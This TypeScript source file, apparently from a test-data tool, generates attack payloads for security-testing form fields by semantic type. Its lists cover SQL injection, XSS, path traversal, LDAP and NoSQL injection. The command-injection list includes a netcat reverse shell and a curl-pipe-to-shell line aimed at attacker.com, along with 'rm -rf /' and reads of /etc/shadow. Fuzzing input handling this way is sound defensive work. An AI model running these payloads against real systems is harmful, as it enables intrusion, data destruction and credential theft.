/**
 * Security test payload generator. Produces attack payloads appropriate
 * to each field's semantic type for security testing of input handling.
 */

import type { FieldDescriptor } from "@/core/engines/types";

/** SQL injection payloads */
const SQL_INJECTION: string[] = [
  "' OR '1'='1",
  "'; DROP TABLE users; --",
  "' UNION SELECT * FROM users --",
  "1; SELECT * FROM information_schema.tables --",
  "' OR 1=1 --",
  "' OR ''='",
  "admin'--",
  "1' ORDER BY 1--+",
  "1' UNION SELECT NULL,NULL,NULL--",
  "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
  "'; EXEC xp_cmdshell('dir'); --",
  "1 OR 1=1",
  "' HAVING 1=1 --",
  "' GROUP BY columnnames HAVING 1=1 --",
  "'; WAITFOR DELAY '0:0:5' --",
  "1' AND (SELECT COUNT(*) FROM sysobjects) > 0 --",
  "' UNION ALL SELECT 1,2,3,4,5--",
  "'; INSERT INTO users VALUES('hacked','hacked'); --",
];

/** Cross-site scripting payloads */
const XSS: string[] = [
  '<script>alert("XSS")</script>',
  "<img src=x onerror=alert(1)>",
  '<svg onload=alert("XSS")>',
  "<body onload=alert('XSS')>",
  '"><script>alert(String.fromCharCode(88,83,83))</script>',
  "javascript:alert('XSS')",
  '<iframe src="javascript:alert(\'XSS\')">',
  "<input onfocus=alert(1) autofocus>",
  '<a href="javascript:alert(1)">click</a>',
  '<div onmouseover="alert(1)">hover me</div>',
  "'-alert(1)-'",
  '<math><mi//xlink:href="data:x,<script>alert(1)</script>">',
  "<details open ontoggle=alert(1)>",
  '{{constructor.constructor("return this")().alert(1)}}',
  "${alert(1)}",
  "<marquee onstart=alert(1)>",
  '<img src="x" onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
];

/** Command injection payloads */
const COMMAND_INJECTION: string[] = [
  "; ls -la",
  "| cat /etc/passwd",
  "`whoami`",
  "$(whoami)",
  "; rm -rf /",
  "| nc -e /bin/sh attacker.com 4444",
  "&& cat /etc/shadow",
  "|| true",
  "; echo vulnerable > /tmp/pwned",
  "| curl http://attacker.com/shell.sh | sh",
  "`id`",
  "$(cat /etc/passwd)",
  "; ping -c 3 attacker.com",
];

/** Path traversal payloads */
const PATH_TRAVERSAL: string[] = [
  "../../../etc/passwd",
  "..\\..\\..\\windows\\system32\\config\\sam",
  "....//....//....//etc/passwd",
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
  "..%252f..%252f..%252fetc%252fpasswd",
  "..%c0%af..%c0%af..%c0%afetc/passwd",
  "/etc/passwd%00.jpg",
  "....\\....\\....\\windows\\win.ini",
];

/** Special characters and edge-case payloads */
const SPECIAL_CHARS: unknown[] = [
  "",
  "\0", // null byte
  "​", // zero-width space
  "﻿", // BOM
  "‍", // zero-width joiner
  "a".repeat(100000), // very long string
  "<>&\"'", // HTML special chars
  "\\", // backslash
  "\r\n", // CRLF
  "\t", // tab
  "%00", // URL-encoded null
  "\x1b[31mred\x1b[0m", // ANSI escape
  "undefined",
  "null",
  "true",
  "false",
  "NaN",
  "Infinity",
  "[object Object]",
  "constructor",
  "__proto__",
  "prototype",
];

/** Format string attack payloads */
const FORMAT_STRINGS: string[] = [
  "%s%s%s%s%s",
  "%x%x%x%x%x",
  "%n%n%n%n%n",
  "%d%d%d%d%d",
  "${7*7}",
  "{{7*7}}",
  "#{7*7}",
  "${7*'7'}",
];

/** LDAP injection payloads */
const LDAP_INJECTION: string[] = [
  "*)(objectClass=*",
  "*()|%26'",
  "admin)(&)",
  "admin)(|(password=*))",
];

/** NoSQL injection payloads */
const NOSQL_INJECTION: unknown[] = [
  '{"$gt":""}',
  '{"$ne":null}',
  '{"$regex":".*"}',
  "true, $where: '1 == 1'",
  "{$gt: ''}",
];

/**
 * SecurityEngine generates security test payloads appropriate to each
 * field's semantic type.
 */
export class SecurityEngine {
  /**
   * Generate security payloads for a given field.
   * Routes payloads based on the field's semantic type.
   */
  generate(field: FieldDescriptor): unknown[] {
    const payloads: unknown[] = [];

    switch (field.semanticType) {
      case "email":
        payloads.push(...this.emailPayloads());
        break;

      case "url":
        payloads.push(...this.urlPayloads());
        break;

      case "integer":
      case "float":
      case "amount":
      case "age":
      case "id":
      case "foreign_key":
        payloads.push(...this.numericPayloads());
        break;

      case "ip_address":
        payloads.push(...SQL_INJECTION.slice(0, 5));
        payloads.push(...COMMAND_INJECTION.slice(0, 5));
        payloads.push(...SPECIAL_CHARS.slice(0, 10));
        break;

      case "username":
      case "password":
        payloads.push(...SQL_INJECTION);
        payloads.push(...XSS);
        payloads.push(...LDAP_INJECTION);
        payloads.push(...NOSQL_INJECTION);
        payloads.push(...SPECIAL_CHARS);
        break;

      case "domain":
        payloads.push(...COMMAND_INJECTION.slice(0, 5));
        payloads.push(...XSS.slice(0, 5));
        payloads.push(...SPECIAL_CHARS.slice(0, 10));
        break;

      case "phone":
      case "ssn":
      case "zipcode":
      case "credit_card_number":
      case "credit_card_cvv":
      case "iban":
      case "routing_number":
      case "account_number":
        payloads.push(...SQL_INJECTION.slice(0, 8));
        payloads.push(...XSS.slice(0, 5));
        payloads.push(...SPECIAL_CHARS);
        break;

      case "first_name":
      case "last_name":
      case "full_name":
      case "company":
      case "job_title":
      case "department":
      case "city":
      case "state":
      case "country":
      case "street":
      case "full_address":
      case "string":
      case "gender":
        payloads.push(...this.stringPayloads());
        break;

      case "date":
      case "datetime":
      case "timestamp":
      case "dob":
      case "credit_card_expiry":
        payloads.push(...SQL_INJECTION.slice(0, 5));
        payloads.push(...SPECIAL_CHARS.slice(0, 10));
        break;

      case "boolean":
        payloads.push(...SQL_INJECTION.slice(0, 3));
        payloads.push(...SPECIAL_CHARS.slice(0, 8));
        break;

      case "enum":
      case "credit_card_type":
      case "currency":
      case "swift_code":
        payloads.push(...SQL_INJECTION.slice(0, 5));
        payloads.push(...XSS.slice(0, 5));
        payloads.push(...SPECIAL_CHARS.slice(0, 10));
        break;

      case "uuid":
      case "mac_address":
        payloads.push(...SQL_INJECTION.slice(0, 5));
        payloads.push(...SPECIAL_CHARS.slice(0, 8));
        break;

      case "latitude":
      case "longitude":
        payloads.push(...this.numericPayloads());
        break;

      default:
        // Unknown types get all attack vectors
        payloads.push(...SQL_INJECTION.slice(0, 5));
        payloads.push(...XSS.slice(0, 5));
        payloads.push(...COMMAND_INJECTION.slice(0, 3));
        payloads.push(...SPECIAL_CHARS.slice(0, 10));
        break;
    }

    return payloads;
  }

  /**
   * Get all payload categories and their contents.
   */
  getAllPayloads(): Record<string, unknown[]> {
    return {
      sql_injection: [...SQL_INJECTION],
      xss: [...XSS],
      command_injection: [...COMMAND_INJECTION],
      path_traversal: [...PATH_TRAVERSAL],
      special_chars: [...SPECIAL_CHARS],
      format_strings: [...FORMAT_STRINGS],
      ldap_injection: [...LDAP_INJECTION],
      nosql_injection: [...NOSQL_INJECTION],
    };
  }

  /**
   * Payloads for string-type fields: XSS + SQL injection + special chars.
   */
  private stringPayloads(): unknown[] {
    return [
      ...XSS,
      ...SQL_INJECTION,
      ...SPECIAL_CHARS,
    ];
  }

  /**
   * Payloads for email fields: XSS in local part + SQL injection.
   */
  private emailPayloads(): unknown[] {
    const emailSpecific: string[] = [
      '<script>alert("XSS")</script>@domain.com',
      "admin'--@domain.com",
      "' OR '1'='1'@domain.com",
      "user@<script>alert(1)</script>.com",
      "user+<img src=x onerror=alert(1)>@domain.com",
      '"; DROP TABLE users; --"@domain.com',
      "user@domain.com\r\nBcc: attacker@evil.com",
      "user@domain.com%0ABcc:attacker@evil.com",
    ];

    return [
      ...emailSpecific,
      ...SQL_INJECTION.slice(0, 8),
      ...XSS.slice(0, 5),
      ...SPECIAL_CHARS.slice(0, 10),
    ];
  }

  /**
   * Payloads for URL fields: XSS javascript: + path traversal.
   */
  private urlPayloads(): unknown[] {
    const urlSpecific: string[] = [
      "javascript:alert(1)",
      "javascript:alert(document.cookie)",
      "data:text/html,<script>alert(1)</script>",
      "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
      "http://evil.com/redirect?url=http://target.com",
      "http://attacker.com\\@target.com",
      "https://evil.com/path/../../../etc/passwd",
      "file:///etc/passwd",
      "ftp://attacker.com/malware",
    ];

    return [
      ...urlSpecific,
      ...PATH_TRAVERSAL,
      ...XSS.slice(0, 5),
      ...SPECIAL_CHARS.slice(0, 8),
    ];
  }

  /**
   * Payloads for numeric fields: SQL injection + format strings.
   */
  private numericPayloads(): unknown[] {
    const numericSpecific: unknown[] = [
      "0",
      "-1",
      "99999999999999999999",
      "-99999999999999999999",
      "1e308",
      "-1e308",
      "NaN",
      "Infinity",
      "-Infinity",
      "0x1A",
      "0b1010",
      "0o17",
      "1.7976931348623157e+308",
    ];

    return [
      ...numericSpecific,
      ...SQL_INJECTION.slice(0, 8),
      ...FORMAT_STRINGS,
      ...SPECIAL_CHARS.slice(0, 8),
    ];
  }
}
